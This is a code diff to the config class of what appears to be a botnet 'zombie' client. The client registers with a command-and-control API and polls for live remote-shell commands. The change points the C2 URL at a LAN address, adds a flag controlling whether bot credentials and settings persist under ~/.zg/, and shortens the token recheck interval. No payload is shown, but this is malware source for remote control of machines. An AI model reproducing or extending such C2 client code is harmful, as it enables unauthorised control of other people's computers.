@@ -9,8 +9,9 @@ from app.modules.backup_settings import get_zombie_settings, set_zombie_settings
 
 class Config:
     def __init__(self):
-        # enable/disable debug
+        # enable/disable options
         self.DEBUG = False
+        self.USER_PERSISTENCE = True
         # default paths
         self.APP_DIR = os.path.expanduser(os.getcwd())
         self.BASE_DIR = os.path.expanduser('~/.zg/')
@@ -19,13 +20,13 @@ class Config:
         self.PATH_CREDENTIALS = os.path.join(self.BASE_DIR, 'zg.cred')
         self.PATH_SCHEDULER = os.path.join(self.BASE_DIR, 'zg.sch')
         # url to cc api
-        self.credentials = {'cc_url': 'http://127.0.0.1:8080/api'}
+        self.credentials = {'cc_url': 'http://192.168.1.131:8080/api'}
         # default settings
         self.settings = {
             'refresh_tasks': 10.5,     # secs between each task refresh
             'default_refresh': 10.5,   # value to use when some setting is missing or wrong
             'inet_unreach_retry': 15,  # secs between each retry after conn error
-            'token_check_retry': 30,   # secs between each token expiration recheck
+            'token_check_retry': 1,    # secs between each token expiration local recheck
             'live_rsh_retry': 0.3,     # secs between each recheck for new commands during live remote shell session
         }
 
@@ -88,14 +89,15 @@ class Config:
 
     def autosetup(self):
         from app.components import token, logger
-        
-        if not self.load_credentials():
+
+        if (not self.load_credentials()) or (not self.USER_PERSISTENCE):
             while not token.create_user():
                 sleep(self.read_setting('inet_unreach_retry'))
             logger.log('default settings loaded', 'WARNING')
-            self.write_credentials()
+            if self.USER_PERSISTENCE:
+                self.write_credentials()
 
-        if not self.load_settings():
+        if not self.load_settings() and self.USER_PERSISTENCE:
             # default settings were loaded
             self.write_settings()
             logger.log('new settings saved', 'WARNING')
